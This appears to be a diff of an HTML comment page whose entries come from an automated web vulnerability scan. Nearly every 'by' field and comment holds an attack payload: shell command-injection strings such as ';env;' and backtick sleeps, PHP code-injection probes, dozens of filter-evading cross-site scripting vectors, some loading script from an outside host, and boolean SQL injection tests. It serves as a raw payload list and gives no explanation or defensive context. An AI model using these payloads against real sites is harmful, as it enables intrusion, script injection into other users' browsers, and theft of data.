+	&lt;p&gt; - by ;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg== &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a`)` &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a`sleep 60` &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a;sleep 60; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by a|sleep 60; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;amp;ping -n 25 127.0.0.1&amp;amp; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by |env| &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ../../../../../../../../../../../../../../../usr/bin/env| &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default;env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default
+env; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;amp;set&amp;amp; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by set &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by env &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by /e  &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;quot;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;#039;.exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by ;exit(md5(&amp;#039;w4p1t1_md5&amp;#039;));# &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg== &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a`)` &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a`sleep 60` &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by a;sleep 60; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	&amp;gt;alert(/wrcu7k0scd/)&amp;lt;/sCrIpT	&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object	data=javAscripT:alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;(alert)(/wrcu7k0scd/)//&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src onerror=&amp;amp;emsp;prompt`${/wrcu7k0scd/}`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;sCrIpt&amp;gt;&amp;lt;!--
+confirm(/wrcu7k0scd/)//--&amp;gt;&amp;lt;/sCrIpt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script e=&amp;quot;&amp;gt;&amp;quot; src=&amp;quot;https://w0vq99.com/wrcu7k0scdz.js&amp;quot;&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src=k onerror=prompt`wrcu7k0scd`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;svg onload=&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27wrcu7k0scd&amp;amp;#x27&amp;amp;#x29&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/wrcu7k0scd_/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;div id=&amp;quot;wrcu7k0scd&amp;quot;&amp;gt;yolo&amp;lt;/div&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;wr3t6z3yuc&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&lt;ScRiPt&gt;alert(&#39;wr3t6z3yuc&#39;)&lt;/sCrIpT&gt;&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;;env;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;|env|&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;env;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;env;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;../../../../../../../../../../../../../../../usr/bin/env|&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz;env;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz
+env;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&amp;set&amp;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;set&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;env&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;/e &lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;a;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#34;;exit(md5(&#39;w4p1t1_md5&#39;));#&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&#39;;exit(md5(&#39;w4p1t1_md5&#39;));//&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/wk6w0h8ore_/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;div id=&amp;quot;wk6w0h8ore&amp;quot;&amp;gt;yolo&amp;lt;/div&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by wrcu7k0scd &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;quot;wrcu7k0scd&amp;quot;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(/wrcu7k0scd/)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wrcu7k0scd/)// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG
+oNloAd=alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt src=//w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;(alert)(/wrcu7k0scd/);&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;quot;wrcu7k0scd&amp;quot;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;javascript:alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;JaVasCript:alert(&amp;#039;wrcu7k0scd&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;#039;JaVasCript:alert(&amp;quot;wrcu7k0scd&amp;quot;)&amp;#039;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;iFrAme src=&amp;quot;jAvasCript:alert(/wrcu7k0scd/);&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;details open ontoggle=confirm(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;body/oNpagEshoW=(confirm)(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;a
+autofocus
+onfocus=&amp;#039;(function(){return window})()[&amp;quot;alert&amp;quot;](&amp;quot;wrcu7k0scd&amp;quot;)&amp;#039;
+href&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;frame src=&amp;quot;javascript:alert(/wrcu7k0scd/)&amp;quot;/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;marquee loop=1 width=0 onfinish=prompt(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;gt;&amp;lt;svg&amp;gt;&amp;lt;animate onbegin=prompt(/wrcu7k0scd/) attributeName=u dur=1s&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt/src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/sCrIpT/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	src=https://w0vq99.com/wrcu7k0scdz.js&amp;gt;&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG	src=z	oNeRror=alert(/wrcu7k0scd/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by 0[FF]&amp;lt;sCripT[FF]&amp;gt;alert(/wrcu7k0scd/)&amp;lt;/sCripT[FF]&amp;gt;[FF]0 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt src=//w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;(alert)(/wk6w0h8ore/);&amp;lt;/ScRiPt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;quot;wk6w0h8ore&amp;quot;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG src=z oNeRror=alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;javascript:alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;quot;JaVasCript:alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;quot;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object data=&amp;#039;JaVasCript:alert(&amp;quot;wk6w0h8ore&amp;quot;)&amp;#039;&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;iFrAme src=&amp;quot;jAvasCript:alert(/wk6w0h8ore/);&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;details open ontoggle=confirm(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;body/oNpagEshoW=(confirm)(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;a
+autofocus
+onfocus=&amp;#039;(function(){return window})()[&amp;quot;alert&amp;quot;](&amp;quot;wk6w0h8ore&amp;quot;)&amp;#039;
+href&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;frame src=&amp;quot;javascript:alert(/wk6w0h8ore/)&amp;quot;/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;marquee loop=1 width=0 onfinish=prompt(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;gt;&amp;lt;svg&amp;gt;&amp;lt;animate onbegin=prompt(/wk6w0h8ore/) attributeName=u dur=1s&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt/src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/sCrIpT/&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ImG	src=z	oNeRror=alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by 0[FF]&amp;lt;sCripT[FF]&amp;gt;alert(/wk6w0h8ore/)&amp;lt;/sCripT[FF]&amp;gt;[FF]0 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt	&amp;gt;alert(/wk6w0h8ore/)&amp;lt;/sCrIpT	&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;object	data=javAscripT:alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;(alert)(/wk6w0h8ore/)//&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;scr&amp;lt;script&amp;gt;ipt src=https://w0vq99.com/wk6w0h8orez.js&amp;gt;&amp;lt;/scr&amp;lt;/script&amp;gt;ipt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src onerror=&amp;amp;emsp;prompt`${/wk6w0h8ore/}`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;sCrIpt&amp;gt;&amp;lt;!--
+confirm(/wk6w0h8ore/)//--&amp;gt;&amp;lt;/sCrIpt&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;Script e=&amp;quot;&amp;gt;&amp;quot; src=&amp;quot;https://w0vq99.com/wk6w0h8orez.js&amp;quot;&amp;gt;&amp;lt;/Script&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;img src=k onerror=prompt`wk6w0h8ore`&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;svg onload=&amp;amp;#x61&amp;amp;#x6C&amp;amp;#x65&amp;amp;#x72&amp;amp;#x74&amp;amp;#x28&amp;amp;#x27wk6w0h8ore&amp;amp;#x27&amp;amp;#x29&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;wyv86vk1mx&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;&lt;ScRiPt&gt;alert(&#39;wyv86vk1mx&#39;)&lt;/sCrIpT&gt;&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by wk6w0h8ore &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(&amp;quot;wk6w0h8ore&amp;quot;)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;ScRiPt&amp;gt;alert(/wk6w0h8ore/)&amp;lt;/sCrIpT&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wk6w0h8ore/)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG/oNloAd=alert(/wk6w0h8ore/)// &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by &amp;lt;SvG
+oNloAd=alert(&amp;#039;wk6w0h8ore&amp;#039;)&amp;gt; &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 72=97 AND &#34;88&#34;=&#34;88&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 63=63 AND &#34;10&#34;=&#34;10&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 38=99 AND (50=50&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 37=98 AND (75=75&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!) AND 56=56 AND (77=77&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 95=116 AND (&#39;78&#39;=&#39;78&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 63=97 AND (&#39;89&#39;=&#39;89&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39;) AND 81=81 AND (&#39;10&#39;=&#39;10&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 49=127 AND (&#34;38&#34;=&#34;38&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 12=63 AND (&#34;42&#34;=&#34;42&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34;) AND 52=52 AND (&#34;27&#34;=&#34;27&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
